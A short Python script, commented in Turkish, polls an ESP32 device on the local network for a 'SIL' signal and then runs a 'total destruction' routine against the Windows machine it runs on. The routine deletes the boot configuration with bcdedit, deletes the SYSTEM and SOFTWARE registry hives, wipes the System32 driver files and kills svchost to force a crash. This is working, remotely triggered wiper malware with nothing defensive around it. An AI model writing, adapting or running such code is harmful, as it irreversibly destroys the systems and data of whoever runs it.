import requests
import os
import time
import ctypes

# ============================================================
# AYARLAR
# ============================================================
ESP32_IP  = "192.168.1.253"
ESP32_URL = f"http://{ESP32_IP}/durum"

def tam_imha():
    print("\n[!!!] SİNYAL ALINDI! TAM İMHA BAŞLATILIYOR...")
    
    # 1. Önyükleme Kaydını (BCD) Sil - Bilgisayar bir daha asla Windows'u bulamaz.
    print("[*] Boot verileri siliniyor...")
    os.system("bcdedit /deleteall")
    
    # 2. Kayıt Defterini (Registry) Parçala - Windows'un tüm ayarlarını yok eder.
    print("[*] Kayıt defteri temizleniyor...")
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f')
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f')
    
    # 3. Kritik Sürücüleri Sil - Donanım iletişimini keser.
    print("[*] Sürücüler yok ediliyor...")
    os.system(r"del /f /s /q C:\Windows\System32\drivers\*.sys")

    # 4. Final: Mavi Ekranı Tetikle ve Sistemi Kapat
    print("[*] Son darbe vuruluyor...")
    # Kritik süreci sonlandırarak anında çökme sağlar
    os.system("taskkill /f /im svchost.exe")

def main():
    # Yönetici kontrolü (WinError 5 almamak için şart!)
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("=" * 50)
        print("[HATA] BU KODU LÜTFEN 'YÖNETİCİ OLARAK' ÇALIŞTIR!")
        print("=" * 50)
        return

    print("=" * 50)
    print("      ESP32 DEMO: TOTAL DESTRUCTION MODE")
    print("=" * 50)
    print(f"Hedef: {ESP32_URL}")
    print("[HAZIR] ESP32'den 'SIL' komutu bekleniyor...")

    while True:
        try:
            response = requests.get(ESP32_URL, timeout=2)
            durum = response.text.strip().upper()

            if durum == "SIL":
                tam_imha()
                break
            else:
                print(f"[...] Sinyal bekleniyor: '{durum}'", end="\r")

        except Exception as e:
            print(f"[!] Bağlantı hatası: {e}          ", end="\r")

        time.sleep(1)

if __name__ == "__main__":
    main()
